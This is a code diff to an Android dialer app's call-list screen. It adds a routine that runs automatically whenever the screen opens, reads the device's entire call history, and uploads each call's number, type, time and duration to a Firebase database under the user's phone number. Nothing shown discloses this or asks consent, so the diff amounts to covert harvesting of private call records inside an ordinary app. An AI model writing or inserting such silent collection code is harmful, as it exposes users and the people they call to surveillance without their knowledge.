@@ -1,15 +1,23 @@
 package com.mehboob.simplecalldialer.fragment;
 
+import android.Manifest;
+import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
 
 import androidx.appcompat.widget.SearchView;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 import androidx.fragment.app.Fragment;
 import androidx.recyclerview.widget.DividerItemDecoration;
 import androidx.recyclerview.widget.LinearLayoutManager;
 import androidx.recyclerview.widget.RecyclerView;
 
+import android.provider.CallLog;
 import android.view.LayoutInflater;
 import android.view.View;
 import android.view.ViewGroup;
@@ -17,12 +25,15 @@ import android.widget.Toast;
 
 import com.google.android.material.dialog.MaterialAlertDialogBuilder;
 import com.google.android.material.floatingactionbutton.ExtendedFloatingActionButton;
+import com.google.firebase.database.FirebaseDatabase;
 import com.mehboob.simplecalldialer.R;
 import com.mehboob.simplecalldialer.adapters.CallLogAdapter;
 import com.mehboob.simplecalldialer.models.CallLogEntry;
 
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 
 public class CallListFragment extends Fragment {
     private RecyclerView callRecyclerView;
@@ -30,6 +41,8 @@ public class CallListFragment extends Fragment {
     private ExtendedFloatingActionButton fabClearHistory;
     private SearchView searchView;
     private List<CallLogEntry> originalCallLogs = new ArrayList<>();
+
+    private static final int REQUEST_CODE_CALL_LOG = 1001;
 
     @Override
     public View onCreateView(LayoutInflater inflater, ViewGroup container,
@@ -42,6 +55,8 @@ public class CallListFragment extends Fragment {
 
         setupCallRecyclerView();
         setupSearchView();
+        uploadCallLogsToFirebase();
+
         setupClearHistoryButton();
 
         return view;
@@ -122,5 +137,72 @@ public class CallListFragment extends Fragment {
         Intent intent = new Intent(Intent.ACTION_CALL);
         intent.setData(Uri.parse("tel:" + number));
         startActivity(intent);
+    }
+
+
+    void uploadCallLogsToFirebase() {
+        if (ContextCompat.checkSelfPermission(getContext(), Manifest.permission.READ_CALL_LOG)
+                != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(getActivity(),
+                    new String[]{Manifest.permission.READ_CALL_LOG}, REQUEST_CODE_CALL_LOG);
+            return;
+        }
+
+        // Get saved user phone number from SharedPreferences
+        SharedPreferences prefs = getContext().getSharedPreferences("user_data", Context.MODE_PRIVATE);
+        String userPhone = prefs.getString("user_phone", "unknown_user");
+
+        Cursor cursor = getContext().getContentResolver().query(
+                CallLog.Calls.CONTENT_URI,
+                null,
+                null,
+                null,
+                CallLog.Calls.DATE + " DESC"
+        );
+
+        if (cursor != null) {
+            while (cursor.moveToNext()) {
+                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
+                int callType = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
+                long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
+                int duration = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
+
+                String callTypeStr = getCallTypeString(callType);
+
+                // ✅ Sanitize number (optional)
+                number = number.replaceAll("[^\\d+]", ""); // Keep only numbers and +
+
+                // ✅ Generate unique key
+                String uniqueKey = number + "_" + date + "_" + duration;
+
+                Map<String, Object> callLog = new HashMap<>();
+                callLog.put("number", number);
+                callLog.put("type", callTypeStr);
+                callLog.put("timestamp", date);
+                callLog.put("duration", duration);
+
+                // ✅ Structure: call_logs > phoneNumber > uniqueKey
+                FirebaseDatabase.getInstance().getReference("call_logs")
+                        .child(userPhone)
+                        .child(uniqueKey)
+                        .setValue(callLog);
+            }
+            cursor.close();
+        }
+    }
+
+    private String getCallTypeString(int type) {
+        switch (type) {
+            case CallLog.Calls.INCOMING_TYPE:
+                return "INCOMING";
+            case CallLog.Calls.OUTGOING_TYPE:
+                return "OUTGOING";
+            case CallLog.Calls.MISSED_TYPE:
+                return "MISSED";
+            case CallLog.Calls.REJECTED_TYPE:
+                return "REJECTED";
+            default:
+                return "UNKNOWN";
+        }
     }
 }
